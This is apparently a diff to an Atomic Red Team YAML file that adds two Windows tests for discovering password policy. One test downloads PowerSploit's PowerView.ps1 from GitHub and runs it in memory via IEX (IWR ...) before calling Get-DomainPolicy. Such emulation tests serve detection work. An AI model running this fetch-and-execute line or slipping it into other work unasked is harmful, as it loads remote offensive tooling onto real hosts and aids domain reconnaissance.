@@ -85,4 +85,27 @@ atomic_tests:
   executor:
     command: pwpolicy getaccountpolicies
     name: bash
-
+- name: Get-DomainPolicy with PowerView
+  auto_generated_guid: 3177f4da-3d4b-4592-8bdc-aa23d0b2e843
+  description: |
+    Utilizing PowerView, run Get-DomainPolicy to return the default domain policy or the domain controller policy for the current domain or a specified domain/domain controller.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainPolicy -verbose
+    name: powershell
+- name: Enumerate Active Directory Password Policy with get-addefaultdomainpasswordpolicy
+  auto_generated_guid: b2698b33-984c-4a1c-93bb-e4ba72a0babb
+  description: |
+    The following Atomic test will utilize get-addefaultdomainpasswordpolicy to enumerate domain password policy.
+    Upon successful execution a listing of the policy implemented will display.
+    Reference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-addefaultdomainpasswordpolicy?view=windowsserver2022-ps
+  supported_platforms:
+  - windows
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      get-addefaultdomainpasswordpolicy
